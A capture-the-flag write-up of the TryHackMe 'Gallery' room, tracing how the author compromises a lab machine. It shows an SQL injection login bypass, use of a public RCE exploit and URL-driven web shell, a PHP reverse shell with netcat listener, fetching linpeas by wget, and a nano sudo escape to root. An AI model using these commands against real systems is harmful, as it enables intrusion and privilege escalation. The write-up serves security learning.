# Gallery





https://tryhackme.com/room/gallery666
---

This room has two flags to identify - the user and the root flag. There are also additional questions to be answered along the way!

Start the machine and scan the target IP address:

```shell
nmap 10.81.167.89 -sV -sC -T4 -n
```

SS1

Port 22, 80, and 8080 are open.

Checking out port 80 and port 8080 on a web browser, I saw that on port 8080 (http://10.81.167.89/gallery/login.php), there is a login panel for Simple Image Gallery System.


SS2

The name of the CMS is Simple Image Gallery. 

I searched for the CMS on exploit database and found: https://www.exploit-db.com/exploits/50214
Simple Image Gallery 1.0 - Remote Code Execution (RCE) (Unauthenticated)

I copied the exploit into a .py file using nano and entered the target url into the script.

SS3

The exploit works by chaining three vulnerabilities to take control of the server. First, it uses SQLi to bypass the login screen and gain admin access. Then, it scrapes profile data of the user to maintain a valid session. Then it exploits an unrestricted file upload vulnerability. It uploads a malicious PHP script which is a web shell that is disguised as a profile picture. The server fails to validate the file as an image and it saves the PHP to a public folder. Then, the script identifies the location of the file which allows attackers to execute system commands remotely with URL parameters (ex: `?cmd=whoami`). 

Make the script executable:

`chmod +x siexploit.py 

and run,

`./siexploit.py`

The output provides a Shell Url: http://10.81.167.89/gallery/uploads/1766984880_TagotlylgrhcaoyhgnlLetta.php?cmd=whoami

the output oft he cmd=whoami is www-data

SS4

This means commands can be executed via the url to display information on the webpage.

For example, the url: http://10.81.167.89/gallery/uploads/1766984880_TagotlylgrhcaoyhgnlLetta.php?cmd=ls

displays the output of the ls command:

```text
1766984880_TagotlylgrhcaoyhgnlLetta.php
gallery.png
no-image-available.png
user_1
```

SS5

This didn't help much though as it did not allow for commands to setup a true reverse shell.
I decided to take the SQLi from the exploit code and try it to login to the login page and it worked.

username = " admin' or '1'='1'# "
password = " "

(the password is a single space)

SS6

Under the albums tab there is a button to add new which could be used to upload a PHP reverse shell.

SS7

Navigate to /usr/share/webshells/php/ to get the reverse shell code in kali. 

Input my IP and port 4444

SS8

Setup a listener and upload the file.

```shell
rlwrap nc -nvlp 4444
```

SS9

SS10

The "image" successfully uploaded and then I had a shell.

SS11

### Then I stabilized the reverse shell like so:


```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

SS12

`export TERM=xterm`

Background the shell on the attacker terminal with ctrl + Z. This suspends the netcat process and returns to a local terminal.


`stty raw -echo

enter a few times

`fg`


SS14

Now that I had a clean shell, it was time to look for the user flag. There is also the question What's the hash password of the admin user? to keep in mind.

I ran

``find / -name user.txt 2>/dev/null``

but the user.txt has permission denied when trying to cat it out.

It is time to escalate privs.

`cd /tmp`

start a python server on host machine:

`python -m http.server 8000

retrieve linpeas on the shell:

`wget http://192.168.182.54:8000/linpeas.sh`

Then I had linpeas downloaded on the shell.

SS15


chmod +x it

and execute it ./


linpeas found some vulnerabilities as shown:

SS16

I tried a dirtypipe exploit but gcc was not installed on the target so I looked further down to see what linpeas had found.

Under "Searching passwords in history files"
it is apparent that there is a password displayed:

b3stpassw0rdbr0xx

This appears to be the user mike's password

Then I 

`su mike`

and pasted his password in.

SS17

I was then operating as user mike and could retrieve the user flag that I found the location of earlier. 

SS18

Cat out the user flag.

now, I did 

`sudo -l`

SS19

/bin/bash /opt/rootkit.sh is interesting so I cat it out. 

Can also run sudo /bin/bash /opt/rootkit.sh

I could not find anything about a sudo exploit on rkhunter on GTFOBins, but I did find something for nano.

https://gtfobins.github.io/gtfobins/nano/#sudo

```
sudo nano
^R^X
reset; sh 1>&0 2>&0
```

run 

`sudo /bin/bash /opt/rootkit.sh`

type read,

SS20

now `^R^X`

and paste the command

`reset; sh 1>&0 2>&0`

(AT THIS POINT THE MACHINE ON TRYHACKME REPEATED TO CRASH SO I HAD TO COMPLETE THE REST OF THE ROOM ON ANOTHER DAY... I HAVE NO FURTHER SCREENSHOTS FOR THE ROOM BECAUSE OF THIS REASON.)

.........

type `id`

no I am root,

cat /root/root.txt

to get the root flag.

---

Then I had to go back to answer the question:
What's the hash password of the admin user?

`cd /var/www/html/gallery/classes`

`cat DBConnection.php`

can see:

`require_once("../initialize.php");`

`cd /var/www/html/gallery/classes`

`cat initialize.php`

This gives the DB username: gallery_user and password: passw0rd321

`mysql`

```text
show databases;

use gallery_db;

show tables

select * from users;

```

This reveals the admin hash

a228b12a08b6527e7976cbe5d914531c